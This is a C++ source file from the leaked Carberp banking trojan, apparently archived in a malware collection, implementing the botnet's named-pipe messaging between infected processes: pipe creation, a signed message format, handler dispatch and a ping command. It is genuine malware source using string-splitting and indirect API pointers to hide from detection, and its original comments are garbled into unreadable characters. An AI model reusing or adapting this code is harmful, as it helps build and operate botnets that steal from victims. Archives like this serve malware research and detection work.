/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------


#pragma hdrstop

#include "Pipes.h"
#include "BotCore.h"
#include "BotDebug.h"

//---------------------------------------------------------------------------


// ���� � ���������� �������
char PipesPath[] = {'\\', '\\', '.', '\\', 'p', 'i', 'p', 'e', '\\',  0};;

// ������� ������� ����
char BotPipePrefix[] = {'b', 't', 'p', 'i', 'p', 'e', 's',  0};


//********************************************************************
//  ���������� ������ ��� ������ � ��������
//********************************************************************

namespace PIPE
{
	// ������ ������ ����� ������
	#define IN_BUF_SIZE 4096

	// ������ ������ �������� ������
	#define OUT_BUF_SIZE 4096

	// �������� ������
	#define PIPE_PARAMS PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT

	// ��������� ���������
	#define MESSAGE_SIGNATURE 0xDD047556

	// ������ ���������
	#define MESSAGE_VERSION 0x00000001


    char OkResponse[] = {'o','k', 0};


    char CommandPing[] = {'p','i','n','g', 0};

	// ��������� �������� ���������� � ������������������ �����������
	typedef struct THandlerRec
	{
    	LPVOID Data;
		PCHAR Message;
		DWORD MessageHash;
		TPipeMessageHandler Handler;

	} *PHandlerRec;
	//------------------------------------------------------------------------

	// ������� ���������� ������ ��� ������
	PCHAR GetFullName(PCHAR Name);

	// ������� ������ �������� ������ � ������
	DWORD WINAPI PipeThreadProc(LPVOID Data);

	// ������� ��������� ���������
    LPBYTE FormatMessage(PCHAR Message, DWORD Size);

	// ���������� ��������� ��������� �� ������
	void ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize, PCHAR Answer, int& AnswerSize );

    // ������� ������������ ���������
	LPBYTE PackMessage(LPBYTE OutBuf, DWORD BufSize, PCHAR PipeMessage, PCHAR Data, DWORD DataSize, DWORD PID, PCHAR ProcessName, DWORD &OutSize);

	// ������� ������������� ���������
	bool UnPackMessage(PCHAR Buf, DWORD BufSize, PPipeMessage Message);

	// ������� �������� ���������
	void CopyMessage(PPipeMessage Source, PPipeMessage Destination);
}


//********************************************************************

PCHAR PIPE::GetFullName(PCHAR Name)
{
	// ������� ���������� ������ ��� ������
	if (STR::IsEmpty(Name))
		return NULL;
	return STR::New(3, PipesPath, BotPipePrefix, Name);
}
//-----------------------------------------------------------------------------

DWORD WINAPI PIPE::PipeThreadProc(LPVOID Data)
{
	// ������� ������ �������� ������ � ������
	PProcessPipe Chanal = (PProcessPipe)Data;

	// ������ �����
	Chanal->Handle = Create(Chanal->Name);

	bool Invalid = Chanal->Handle == NULL;

	// ���������� �����, ���������, �� ��������� �������������
    pSetEvent(Chanal->Event);

	if (Invalid) return 0;

	PCHAR Buf = STR::Alloc(IN_BUF_SIZE + 1);
	PCHAR Answer = STR::Alloc(IN_BUF_SIZE + 1);

	// ��������� ���� �������� ��������
 	while(!Chanal->Terminated)
	{
		// ������� ����������� �������
		BOOL Connected = (BOOL)pConnectNamedPipe(Chanal->Handle, NULL);

		/* TODO : ������� ��������� ������ ����������� ������� ������ */
		if (!Connected)
		{
			return 0;
		}

		// ��������� ���� ������ �������
		while (!Chanal->Terminated)
		{
			m_memset(Buf, 0, IN_BUF_SIZE + 1);
			DWORD Readed = 0;
			// ������� ����������� ������ � ����
			if (pReadFile(Chanal->Handle, Buf, IN_BUF_SIZE, &Readed, NULL))
			{
				// ������������ ���������
				int AnswerSize;
				ProcessMessage(Chanal, Buf, Readed, Answer, AnswerSize);

				// ���������� ������� � ����������� ���������
				DWORD OutMsgSize = 0;

				PackMessage((LPBYTE)Buf, IN_BUF_SIZE, OkResponse, Answer, AnswerSize, 0, NULL, OutMsgSize);

				pWriteFile(Chanal->Handle, Buf, OutMsgSize, &Readed, NULL);
			}
			else
			{
				break;
			}
		}

		pDisconnectNamedPipe(Chanal->Handle);
	}

	STR::Free(Buf);
	STR::Free(Answer);

	pCloseHandle(Chanal->Handle);

	pSetEvent(Chanal->Event);

	return 0;
}
//-----------------------------------------------------------------------------

void PIPE::ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize, PCHAR Answer, int& AnswerSize )
{
	// ���������� ��������� ��������� �� ������
	if (STR::IsEmpty(Msg) || MsgSize == 0)
		return;
	// ��������� ���������
	TPipeMessage Message;
	if (!UnPackMessage(Msg, MsgSize, &Message))
		return;
	// �������� ����������� ���������
	pEnterCriticalSection(&Pipe->Lock);

    bool Cancel = false;

	for (DWORD i = 0; i < List::Count(Pipe->Handlers); i++)
	{
		PHandlerRec Rec = (PHandlerRec)List::GetItem(Pipe->Handlers, i);

		if (!STR::IsEmpty(Rec->Message))
		{
			// ��������� ����� ���������
			if (!StrSame(Rec->Message, Message.Message, true, 0))
				continue;
		}
		else
		if (Rec->MessageHash != 0)
		{
			// ��������� ��� ���������
			if (Rec->MessageHash != Message.MessageHash)
            	continue;
		}

		Rec->Handler(Rec->Data, &Message, Cancel);
		m_memcpy( Answer, Message.Data, Message.DataSize );
		AnswerSize = Message.DataSize;

		if (Cancel)
        	break;
	}

	pLeaveCriticalSection(&Pipe->Lock);

}
//-----------------------------------------------------------------------------

LPBYTE PIPE::PackMessage(LPBYTE OutBuf, DWORD BufSize, PCHAR PipeMessage, PCHAR Data, DWORD DataSize, DWORD PID, PCHAR ProcessName, DWORD &OutSize)
{

	OutSize = 0;

	if (PID == 0)
		PID = GetUniquePID();

	// ������� ��������� ���������
	LPBYTE Message = OutBuf;
	if (BufSize == 0)
		BufSize = OUT_BUF_SIZE;

	if (OutBuf == NULL)
		Message = (LPBYTE)MemAlloc(BufSize);

	m_memset(Message, 0, BufSize);

	if (Message == NULL)
    	return NULL;

	LPBYTE Buf = Message;

	#define AddDWORD(V) *(PDWORD)Buf = V; Buf += sizeof(DWORD)

	AddDWORD(MESSAGE_SIGNATURE); // ���������� ���������
	AddDWORD(MESSAGE_VERSION);   // ���������� ������
	AddDWORD(PID);               // ���������� PID

	// ���������� ������ ����� ��������
	DWORD  PNS = StrCalcLength(ProcessName);
	AddDWORD(PNS);

	// ���������� ��� ��������
	m_memcpy(Buf, ProcessName, PNS);
	Buf += PNS;

	// ���������� ��� ���������
    DWORD MsgSize = StrCalcLength(PipeMessage);
	AddDWORD(MsgSize);
	m_memcpy(Buf, PipeMessage, MsgSize + 1); // ��������� ������� ������
    Buf += MsgSize + 1;

	// ���������� ������ ���������
    AddDWORD(DataSize);
	m_memcpy(Buf, Data, DataSize);
	Buf += DataSize;

	OutSize = Buf - Message;
	OutSize++; // ����������� ����

	return Message;
}


bool PIPE::UnPackMessage(PCHAR Buf, DWORD BufSize, PPipeMessage Message)
{
	// ������� ������������� ���������
	if (Buf == NULL || BufSize == 0)
		return false;

	PCHAR Tmp = Buf;

	#define GetDWORD() *(PDWORD)Tmp; Tmp += sizeof(DWORD)

	ClearStruct(*Message);

	// ��������� ��������� ���������
	DWORD Signature = GetDWORD();
	DWORD Version   = GetDWORD();

	if (Signature != MESSAGE_SIGNATURE || Version != MESSAGE_VERSION)
		return false;

	// �������� ���������� � ��������, �����������
	Message->PID = GetDWORD();

	DWORD PNS = GetDWORD();
	Message->ProcessName = Tmp;
	Tmp += PNS;

	// ���������� ���������
	Message->MsgSize     = GetDWORD();
	Message->Message     = Tmp;
    Tmp += Message->MsgSize + 1;
	Message->DataSize    = GetDWORD();
	Message->Data        = Tmp;

    Message->MessageHash = CalcHash(Message->Message);

	return true;
}

void PIPE::CopyMessage(PPipeMessage Source, PPipeMessage Destination)
{
	// ������� �������� ���������
	if (Source == NULL || Destination == NULL)
		return;

    Destination->PID = Source->PID;

}

//********************************************************************

HANDLE PIPE::Create(PCHAR Name)
{
	// ������� ������ ������ ������������ ������

	// �������� ��� ������
	PCHAR PipeName = GetFullName(Name);
	if (PipeName == NULL)
		return NULL;

	// ������ �����
	HANDLE Handle = (HANDLE)pCreateNamedPipeA(
								PipeName,
								PIPE_ACCESS_DUPLEX,
								PIPE_PARAMS,
								PIPE_UNLIMITED_INSTANCES,
								IN_BUF_SIZE,
								OUT_BUF_SIZE, 5000, NULL);

	if (Handle == INVALID_HANDLE_VALUE)
    	Handle = NULL;

	// ����������� ��������� �������
	STR::Free(PipeName);

	return Handle;
}
//-----------------------------------------------------------------------------

PProcessPipe PIPE::CreateProcessPipe(const PCHAR PipeName, bool StartPipe)
{
	// ������� ������ ���������� ����� �������� � ��������� �������
	// �������� ���������
	if (STR::IsEmpty(PipeName))
		return NULL;

	// ������ ��������� ������
	PProcessPipe Pipe = CreateStruct(TProcessPipe);
	if (Pipe == NULL)
		return NULL;

    // �������������� ������
	Pipe->Name = STR::New(PipeName);
	Pipe->Handlers = List::Create();
	pInitializeCriticalSection(&Pipe->Lock);


	if (!StartPipe)
		return Pipe;

    // ��������� �����

	if (!StartProcessPipe(Pipe))
	{
    	// ��������� ������ ������������� ������
		List::Free(Pipe->Handle);
		STR::Free(Pipe->Name);
		FreeStruct(Pipe);
		Pipe = NULL;
    }

	return Pipe;
}
//-----------------------------------------------------------------------------

bool PIPE::StartProcessPipe(PProcessPipe Pipe)
{
	//  ������� �������� ������ ������
	if (Pipe == NULL)
		return false;

	if (Pipe->Handle != NULL)
		return true;

	Pipe->Event = (HANDLE)pCreateEventA(NULL, TRUE, FALSE, NULL);

	// ��������� �����
	StartThread(PipeThreadProc, Pipe);


	// ������� ������ ������ �� ��������� �������������
	pWaitForSingleObject(Pipe->Event, INFINITE);

	pCloseHandle(Pipe->Event);
	return Pipe->Handle != NULL;
}
//-----------------------------------------------------------------------------

void PIPE::FreeProcessPipe(PProcessPipe Pipe)
{
	//  FreeProcessPipe ������� ���������� ���� ��������
	if (Pipe == NULL)
		return;

	Pipe->Event = pCreateEventA(NULL, TRUE, FALSE, NULL);
	Pipe->Terminated = true;

	pWaitForSingleObject(Pipe->Event, INFINITE);

	pCloseHandle(Pipe->Event);
	FreeStruct(Pipe);
}

//-----------------------------------------------------------------------------

bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg, PCHAR Data, DWORD DataSize, void* Answer)
{
	// ������� ���������� ���������� ������ ���������
	if (Msg == NULL || STR::IsEmpty(PipeName))
		return false;

	// �������� ������ ��� ������
	PCHAR Name = GetFullName(PipeName);
	if (Name == NULL)
		return false;

	if (DataSize == 0 && Data != NULL)
    	DataSize = StrCalcLength(Data);

	bool Result = false;
	for(;;)
	{
		// ��������� ����
		HANDLE Pipe = (HANDLE)pCreateFileA(Name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (Pipe != INVALID_HANDLE_VALUE)
		{
    		// ��������� ���������
			DWORD OutSize = 0;
			LPBYTE OutMessage = PackMessage(NULL, 0, Msg, Data, DataSize, 0, NULL, OutSize);
			// ���������� ������
			if (OutMessage != NULL)
			{
				DWORD Writed = 0;
				pWriteFile(Pipe, OutMessage, OutSize, &Writed, NULL);
				MemFree(OutMessage);

				// ������� ����� �������
				if (Writed == OutSize)
				{
					PCHAR InBuf = STR::Alloc(IN_BUF_SIZE);
					DWORD Readed = 0;

					if ((BOOL)pReadFile(Pipe, InBuf, IN_BUF_SIZE, &Readed, NULL))
					{
						TPipeMessage Msg;
						ClearStruct(Msg);

						UnPackMessage(InBuf, Readed, &Msg);
                		Result = Readed != 0;
						if( Result && Answer )
							m_memcpy( Answer, Msg.Data, Msg.DataSize );
					}

					STR::Free(InBuf);
				}
			}

			// ��������� ����
		    pCloseHandle(Pipe);
			break;
		}
		else
			if( pGetLastError() == ERROR_PIPE_BUSY )
				pSleep(1);
			else
				break;
			
	}

	STR::Free(Name);
	return Result;
}
//-----------------------------------------------------------------------------

bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg)
{
	return PIPE::SendMessage(PipeName, Msg, NULL, 0, NULL);
}
//-----------------------------------------------------------------------------


DWORD PIPE::Ping(PCHAR PipeName)
{
	//  ������� ��������� ������������� ������ PipeName
	if (STR::IsEmpty(PipeName))
		return false;

	return PIPE::SendMessage(PipeName, CommandPing);
}

//-----------------------------------------------------------------------------

bool PIPE::RegisterMessageHandler(PProcessPipe Pipe, TPipeMessageHandler Handler,
							LPVOID Data, PCHAR Message, DWORD MessageHash)
{
	// ������� ������������ ���������� ���������
	if (Pipe == NULL || Handler == NULL)
		return false;

	PHandlerRec Rec = CreateStruct(THandlerRec);
	if (Rec == NULL)
		return false;

	Rec->Data = Data;
	Rec->Handler = Handler;
	Rec->Message = STR::New(Message);
    Rec->MessageHash = MessageHash;

	pEnterCriticalSection(&Pipe->Lock);

    List::Add(Pipe->Handlers, Rec);

	pLeaveCriticalSection(&Pipe->Lock);
	return true;
}
